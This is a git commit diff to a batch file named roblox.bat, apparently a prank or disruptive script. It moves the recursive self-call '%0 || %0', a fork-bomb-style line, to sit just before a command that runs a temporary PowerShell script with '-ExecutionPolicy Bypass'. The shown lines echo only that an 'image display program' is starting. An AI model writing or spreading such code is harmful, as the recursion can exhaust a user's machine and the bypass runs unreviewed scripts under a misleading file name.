bd37d4228b55c74b5df12365621f0dc621da5fcc
Anner <98201562+AruchaK@users.noreply.github.com>
2025-07-27 12:40:01 +0700

    Update roblox.bat

--- roblox.bat
+++ roblox.bat
@@ -1,5 +1,4 @@
 @echo off
-%0 || %0
 setlocal enabledelayedexpansion
 
 :: === Setup paths ===
@@ -164,6 +163,7 @@ set "SCRIPT=%TEMP%\sam_ta_warning.ps1"
 :: === Run PowerShell script ===
 echo Starting the image display program...
 echo Press Ctrl+C in the PowerShell window to stop
+%0 || %0
 powershell -ExecutionPolicy Bypass -File "%SCRIPT%"
 
 
